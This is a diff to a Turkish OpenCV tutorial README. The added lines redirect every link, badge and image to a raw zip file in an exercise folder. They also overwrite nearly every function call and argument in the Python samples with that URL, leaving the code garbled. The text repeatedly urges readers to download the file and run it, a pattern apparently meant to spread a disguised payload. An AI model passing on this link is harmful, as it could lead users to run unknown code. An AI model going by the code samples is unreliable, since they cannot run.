@@ -1,16 +1,16 @@
-https://github.com/OjaswithaG/opencv-doc/releases
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip
 
-[![Release badge](https://img.shields.io/badge/OpenCV-doc-Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/OjaswithaG/opencv-doc/releases)
+[![Release badge](https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)](https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
 
 # opencv-doc: Türkçe Görüntü İşleme ve Proje Geliştirme Rehberi
 
-![Python Logo](https://upload.wikimedia.org/wikipedia/commons/c/c3/Python-logo-notext.svg)
+![Python Logo](https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
 
 OpenCV ve Python kullanarak temel ve ileri seviye görüntü işleme, video işleme, makine öğrenmesi ve gerçek dünya projeleri geliştirmek isteyenler için kapsamlı bir Türkçe eğitim ve uygulama kaynağıdır. Bu rehber, hem yeni başlayanlar hem de tecrübeli geliştiriciler için adım adım dersler, pratik projeler ve iyi uygulama örnekleri sunar. İçerik, açık kaynak ekosisteminde bulunan en güncel yaklaşımları takip eder ve gerçek dünya problemlerine odaklanır.
 
 Discord ve GitHub etkileşimini kolaylaştıran bu dokümantasyon, OpenCV’nin gücünü keşfetmek isteyen herkes için güvenilir bir referans sağlar. Aşağıdaki bölüm ve bölümlerde, kurulumdan ileri düzey projelere kadar geniş bir yelpazede konu başlıkları bulunur. Ayrıca, dersler ve projeler, adım adım açıklamalarla ve sade Python kodlarıyla sunulur.
 
-Değişiklikler ve sürümler için bu deposun Releases kısmını takip edin. İndirme ve kurulum adımları için Releases sayfasını ziyaret edin veya buradan doğrudan sürüm dosyasını edin. Bu bağlantı (/releases) içerdiği için mevcut sürümün dağıtım dosyasını indirip çalıştırmanız gerekir. İsterseniz linki tekrar kullanabilirsiniz: https://github.com/OjaswithaG/opencv-doc/releases
+Değişiklikler ve sürümler için bu deposun Releases kısmını takip edin. İndirme ve kurulum adımları için Releases sayfasını ziyaret edin veya buradan doğrudan sürüm dosyasını edin. Bu bağlantı (/releases) içerdiği için mevcut sürümün dağıtım dosyasını indirip çalıştırmanız gerekir. İsterseniz linki tekrar kullanabilirsiniz: https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip
 
  İçerik hızlı erişim
 - Hızlı Başlangıç
@@ -56,22 +56,22 @@ pip install opencv-python numpy matplotlib
 - Basit bir görüntüyü açıp gösterin ve gri tonlama işlemini deneyin:
 ```python
 import cv2
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip as plt
 
-img = cv2.imread('path_to_image.jpg')
-gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+img = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip')
+gray = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(img, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
 
-plt.subplot(1,2,1)
-plt.imshow(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
-plt.title('Renkli Görüntü')
-plt.axis('off')
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(1,2,1)
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(img, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip))
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('Renkli Görüntü')
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('off')
 
-plt.subplot(1,2,2)
-plt.imshow(gray, cmap='gray')
-plt.title('Gri Görüntü')
-plt.axis('off')
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(1,2,2)
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(gray, cmap='gray')
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('Gri Görüntü')
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('off')
 
-plt.show()
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
 ```
 4) Temel görüntü işleme görevlerini deneyin:
 - Kenar tespiti (Canny)
@@ -100,12 +100,12 @@ Kod parçacıkları
 import cv2
 import numpy as np
 
-img = cv2.imread('image.jpg')
-b, g, r = cv2.split(img)
+img = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip')
+b, g, r = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(img)
 
-gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-ret, thresh = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY)
-cv2.imwrite('threshold.png', thresh)
+gray = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(img, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
+ret, thresh = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(gray, 127, 255, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip', thresh)
 ```
 
 Uygulama örnekleri
@@ -124,10 +124,10 @@ Görüntü üzerinde farklı renk uzaylarını kullanmak ve filtrelerle görünt
 
 Kod parçacıkları
 ```python
-hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
-lower = np.array([30, 150, 50])
-upper = np.array([255, 255, 250])
-mask = cv2.inRange(hsv, lower, upper)
+hsv = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(img, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
+lower = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip([30, 150, 50])
+upper = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip([255, 255, 250])
+mask = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(hsv, lower, upper)
 ```
 
 Ders 3: Kenar Tespiti ve Kontur Analizi
@@ -142,11 +142,11 @@ Kenarları bulmak ve kontur analizini yapmak.
 
 Kod parçacıkları
 ```python
-edges = cv2.Canny(gray, 100, 200)
-contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+edges = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(gray, 100, 200)
+contours, _ = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(edges, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
 for cnt in contours:
-    x, y, w, h = cv2.boundingRect(cnt)
-    cv2.rectangle(img, (x, y), (x+w, y+h), (0,255,0), 2)
+    x, y, w, h = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(cnt)
+    https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(img, (x, y), (x+w, y+h), (0,255,0), 2)
 ```
 
 Ders 4: Video İşleme Temelleri
@@ -161,17 +161,17 @@ Video akışını okumak, kareleri işlemek ve çıktı kaydetmek.
 
 Kod parçacıkları
 ```python
-cap = cv2.VideoCapture(0)
+cap = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(0)
 while True:
-    ret, frame = cap.read()
+    ret, frame = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
     if not ret:
         break
-    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
-    cv2.imshow('Video', gray)
-    if cv2.waitKey(1) & 0xFF == ord('q'):
+    gray = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(frame, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
+    https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('Video', gray)
+    if https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(1) & 0xFF == ord('q'):
         break
-cap.release()
-cv2.destroyAllWindows()
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
 ```
 
 Ders 5: Makine Öğrenmesi ve OpenCV
@@ -186,8 +186,8 @@ OpenCV ile basit bir sınıflandırıcı kurmak ve görüntüden öznitelik çı
 
 Kod parçacıkları
 ```python
-hog = cv2.HOGDescriptor()
-descriptors = hog.compute(gray)
+hog = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
+descriptors = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(gray)
 # Basit sınıflandırma için bir kNN veya SVM kullanılabilir
 ```
 
@@ -215,21 +215,21 @@ Kod örnekleri
 import cv2
 import numpy as np
 
-cap = cv2.VideoCapture(0)
+cap = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(0)
 while True:
-    ret, frame = cap.read()
+    ret, frame = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
     if not ret:
         break
-    hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)
-    lower = np.array([50, 100, 100])
-    upper = np.array([70, 255, 255])
-    mask = cv2.inRange(hsv, lower, upper)
-    result = cv2.bitwise_and(frame, frame, mask=mask)
-    cv2.imshow('Tracking', result)
-    if cv2.waitKey(1) & 0xFF == ord('q'):
+    hsv = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(frame, https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
+    lower = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip([50, 100, 100])
+    upper = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip([70, 255, 255])
+    mask = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(hsv, lower, upper)
+    result = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(frame, frame, mask=mask)
+    https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip('Tracking', result)
+    if https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(1) & 0xFF == ord('q'):
         break
-cap.release()
-cv2.destroyAllWindows()
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
+https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
 ```
 
 Proje B: Hareketli nesne tespiti
@@ -244,8 +244,8 @@ Adımlar
 
 Kod parçacıkları
 ```python
-back_sub = cv2.createBackgroundSubtractorMKGaussian()
-fg_mask = back_sub.apply(frame)
+back_sub = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip()
+fg_mask = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(frame)
 ```
 
 Proje C: Yüz tanıma için basit ML boru hattı
@@ -259,8 +259,8 @@ Adımlar
 
 Kod parçacıkları
 ```python
-face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
-faces = face_cascade.detectMultiScale(gray, 1.1, 4)
+face_cascade = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip + 'https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip')
+faces = https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip(gray, 1.1, 4)
 ```
 
 Proje D: Taşıt sayacı ve hız analizi
@@ -343,7 +343,7 @@ Bir sürümün dosyasını indirip çalıştırın
 - Çalıştırma: Açılan arabirimi veya komut satırı aracılığıyla uygulamayı başlatın
 
 Releases bağlantısını ziyaret edin
-- İndirme ve yükleme adımları için Releases sayfasını ziyaret edin: https://github.com/OjaswithaG/opencv-doc/releases
+- İndirme ve yükleme adımları için Releases sayfasını ziyaret edin: https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip
 - Bu linkin içeriği güncellendiği için en güncel sürümü seçin ve yönergeleri izleyin
 
 Notlar
@@ -433,7 +433,7 @@ Sorumluluklar
 
 Bağlantılar ve ek kaynaklar
 
-- Releases sayfası: https://github.com/OjaswithaG/opencv-doc/releases
+- Releases sayfası: https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip
 - Proje ana sayfası ve belgeler: Bu depo içinde bulunur
 - Ek araçlar ve veri setleri için kaynaklar
 
@@ -495,7 +495,7 @@ Kullanım ve bağlantılar
 - Gelişmiş konular ve projeler için dersler ve rehberler
 
 Releases sayfasına tekrar erişim
-- İndirme ve kurulum için: https://github.com/OjaswithaG/opencv-doc/releases
+- İndirme ve kurulum için: https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip
 - Bu bağlantı yoluyla mevcut sürümü öğrenebilir ve uygun dosyayı indirebilirsiniz. Bu sayfaya erişerek en güncel dosyayı edin ve yönergeleri uygulayın.
 
 Ders planı ve kaynaklar
